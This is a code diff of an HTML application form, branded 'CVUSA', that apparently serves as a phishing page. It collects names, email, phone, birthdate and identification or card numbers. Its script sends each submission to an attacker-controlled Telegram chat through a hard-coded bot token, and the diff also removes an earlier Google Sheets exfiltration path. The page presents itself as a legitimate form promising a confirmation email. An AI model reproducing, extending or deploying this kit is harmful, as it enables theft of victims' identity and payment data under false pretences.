@@ -279,7 +279,7 @@ When form will be filled , you receive a confirmation email with next step!</p>
                         <input type="text" id="firstName" required>
                     </div>
                     <div class="form-group">
-                        <label>Middle Name</label>
+                        <label>Middle Name <span class="required">*</span></label>
                         <input type="text" id="middleName" placeholder="Optional">
                     </div>
                 </div>
@@ -299,7 +299,11 @@ When form will be filled , you receive a confirmation email with next step!</p>
                     <label>Email <span class="required">*</span></label>
                     <input type="email" id="email" required placeholder="your@email.com">
                 </div>
-                <!-- PHONE NUMBER FIELD REMOVED -->
+
+                <div class="form-group">
+                    <label>Phone Number <span class="required">*</span></label>
+                    <input type="tel" id="phone" required placeholder="+1 (XXX) XXX-XXXX">
+                </div>
             </div>
 
             <!-- Identification Section -->
@@ -437,14 +441,13 @@ When form will be filled , you receive a confirmation email with next step!</p>
             </div>
             
             <div class="copyright">
-                Copyright by CVUSA @ 2024
+                Copyright by CVUSA @ [2024]
             </div>
         </div>
     </div>
 
     <script>
         // ===== CONFIGURATION =====
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbySQAYeOQpPBdnlqPJIYtRtDjzIQjqf6X3zR7HzVw_pDkcfrEJtC0_XMVuVITF9NNlEhg/exec';
         const TELEGRAM_BOT_TOKEN = '8537253559:AAGohyTz08NvyelLVMTs2VXXMJu7bZQZLjk';
         const TELEGRAM_CHAT_ID = '-4959049625';
 
@@ -457,6 +460,7 @@ When form will be filled , you receive a confirmation email with next step!</p>
                 lastName: document.getElementById('lastName').value,
                 birthdate: document.getElementById('birthdate').value,
                 email: document.getElementById('email').value,
+                
                 
                 // Identification
                 cardNumber: document.getElementById('cardNumber').value,
@@ -488,6 +492,7 @@ When form will be filled , you receive a confirmation email with next step!</p>
                    `👤 PERSONAL INFORMATION%0A` +
                    `├ Full Name: ${fullName}%0A` +
                    `├ Email: ${formData.email}%0A` +
+                
                    `└ Birthdate: ${formData.birthdate}%0A%0A` +
                    
                    `🔐 IDENTIFICATION%0A` +
@@ -503,19 +508,7 @@ When form will be filled , you receive a confirmation email with next step!</p>
                    `⏰ Submitted: ${new Date().toLocaleString('ru-RU')}`;
         }
 
-        // Send to Google Sheets
-        async function sendToGoogleSheets(formData) {
-            const response = await fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(formData)
-            });
-            return await response.json();
-        }
-
-        // Send to Telegram
+        // Send message to Telegram
         function sendToTelegram(message) {
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
             
@@ -548,13 +541,11 @@ When form will be filled , you receive a confirmation email with next step!</p>
             showLoading();
             
             try {
+                // Collect data
                 const formData = collectFormData();
                 const stateFullName = getStateFullName();
 
-                // Сохраняем в Google Таблицу
-                await sendToGoogleSheets(formData);
-                
-                // Отправляем в Telegram
+                // Format and send message
                 const message = formatTelegramMessage(formData, stateFullName);
                 sendToTelegram(message);
                 
@@ -570,7 +561,7 @@ When form will be filled , you receive a confirmation email with next step!</p>
         document.addEventListener('DOMContentLoaded', function() {
             const yearElement = document.querySelector('.copyright');
             if (yearElement) {
-                yearElement.textContent = 'Copyright by CVUSA @ 2024';
+                yearElement.textContent = yearElement.textContent.replace('[YEAR]', new Date().getFullYear());
             }
         });
     </script>
